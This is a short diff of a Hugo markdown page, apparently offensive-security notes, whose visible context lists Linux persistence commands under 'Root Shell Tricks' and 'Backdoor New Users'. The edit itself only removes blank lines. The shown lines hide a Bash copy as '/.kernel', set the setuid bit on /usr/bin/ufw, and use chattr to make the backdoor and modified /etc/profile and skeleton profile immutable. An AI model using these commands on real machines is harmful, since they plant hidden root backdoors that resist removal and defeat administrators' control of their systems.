@@ -6,9 +6,7 @@ date = 2025-09-05T11:14:36-04:00
 draft = false
 +++
 
-
 ### Root Shell Tricks
-
 
 {{< highlight bash "linenos=inline" >}}
 # Create a copy of Bash as `.kernel` — could be used for stealth or persistence
@@ -25,7 +23,6 @@ chattr +i /.kernel
 
 {{< /highlight >}}
 
-
 ### Backdoor New Users
 
 {{< highlight bash "linenos=inline" >}}
@@ -41,6 +38,3 @@ chmod +s /usr/bin/ufw
 # Make backdoor and modified profiles immutable (hard to remove, even by root)
 chattr +i /usr/bin/ufw /etc/profile /etc/skel/.profile
 {{< /highlight >}}
-
-
-
